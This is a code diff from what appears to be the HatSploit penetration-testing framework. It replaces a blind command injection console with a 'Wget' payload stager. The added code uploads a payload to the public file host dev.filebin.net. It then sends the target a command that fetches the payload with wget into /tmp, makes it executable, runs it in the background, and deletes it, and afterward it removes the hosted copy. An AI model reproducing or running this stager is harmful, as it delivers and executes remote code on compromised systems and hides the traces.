@@ -24,25 +24,36 @@
 # SOFTWARE.
 #
 
+import os
+import requests
+import binascii
+
 from hatsploit.core.cli.badges import Badges
 
 
-class Blinder:
+class Wget:
     badges = Badges()
 
-    def blinder(self, sender, args=[]):
-        self.badges.print_empty()
-        self.badges.print_information("Welcome to Blinder, blind command injection handler.")
-        self.badges.print_information("Blinder is not a reverse shell, just a blind command injection.")
-        self.badges.print_empty()
+    def send(self, payload, sender, args=[], payload_args="", delim=';',
+             location='/tmp', linemax=100):
+        self.badges.print_process("Sending payload stage...")
+        filename = binascii.hexlify(os.urandom(8)).decode()
+        path = location + '/' + filename
 
-        while True:
-            command = self.badges.input_empty("blinder > ")
-            if not command.strip() or command == 'exit':
-                return
+        wget_bin = binascii.hexlify(os.urandom(8)).decode()
+        wget_file = binascii.hexlify(os.urandom(8)).decode()
+        
+        wget_container = f"https://dev.filebin.net/{wget_bin}"
+        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"
 
-            self.badges.print_process("Sending command to target...")
-            output = sender(*args, command)
-            if output:
-                self.badges.print_empty(f'\n{output}')
-            self.badges.print_empty('')
+        wget_stream = "wget '{}' -qO {}"
+
+        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
+        self.badges.print_process("Uploading payload...")
+
+        self.badges.print_process("Executing payload...")
+        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}"
+        args = args if args is not None else ""
+
+        sender(*args, {command})
+        requests.delete(wget_container)
